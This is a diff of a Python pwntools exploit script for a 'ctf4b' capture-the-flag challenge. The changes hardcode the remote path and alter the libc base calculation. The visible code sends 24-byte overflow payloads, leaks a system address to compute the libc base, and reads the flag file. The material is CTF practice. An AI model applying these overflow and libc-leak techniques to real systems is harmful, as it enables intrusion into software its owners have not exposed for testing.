@@ -40,10 +40,7 @@ def main():
 
     io.sendlineafter("Name: ", pl1)
 
-    if remote:
-        io.sendline("./ctf4b")
-    else:
-        io.sendline("./")
+    io.sendline("./ctf4b")
 
     pl2 = b"A" * 24
     # opendirでディレクトリを開く
@@ -102,20 +99,14 @@ def main():
     io.recvuntil("flag")
 
     file_name = "flag" + io.recvuntil(".txt").decode()
-    print(f"file_name = {file_name}")
-    flag_location = ""
-    if remote:
-        flag_location = "./ctf4b/" + file_name
-    else:
-        flag_location = "./" + file_name
+    print(f"file_name: {file_name}")
 
     io.close()
 
     io = connect()
 
     io.recvuntil("system@0x")
-    libc.base = 0
-    libc.base = int(io.recv(12), 16) - unwrap(libc.symbol("system"))
+    libc.base = int(io.recv(12), 16) - unwrap(libc.symbol("system") - libc.base)
 
     pl3 = b"A" * 24
 
@@ -154,11 +145,11 @@ def main():
 
     io.sendlineafter("Name: ", pl3)
 
-    io.sendline(flag_location)
+    io.sendline("./ctf4b/" + file_name)
     io.sendline("r")
 
     io.recvuntil("ctf4b")
-    flag = "flag = ctf4b" + io.recvuntil("}").decode()
+    flag = "flag: ctf4b" + io.recvuntil("}").decode()
     print(flag)
 
 
